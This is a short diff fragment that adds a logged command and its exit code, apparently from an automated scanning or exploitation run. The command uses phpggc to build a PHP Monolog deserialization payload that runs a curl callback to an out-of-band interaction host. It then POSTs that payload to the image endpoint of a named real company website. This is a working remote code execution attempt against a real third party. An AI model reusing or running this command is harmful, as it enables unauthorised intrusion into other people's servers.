@@ -1,0 +1,4 @@
+# command: timeout 300 sh -c 'phpggc Monolog/RCE1 system '"'"'curl -s http://oob4dde2135ffd4.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/dphp'"'"' > /tmp/deser_php_$$.bin 2>/dev/null; curl -s -m 20 -o /dev/null -H '"'"'Content-Type: application/x-www-form-urlencoded'"'"' --data-binary @/tmp/deser_php_$$.bin https://www.infinitycapital.bh/_next/image'
+# exit_code: 0
+# ---
+
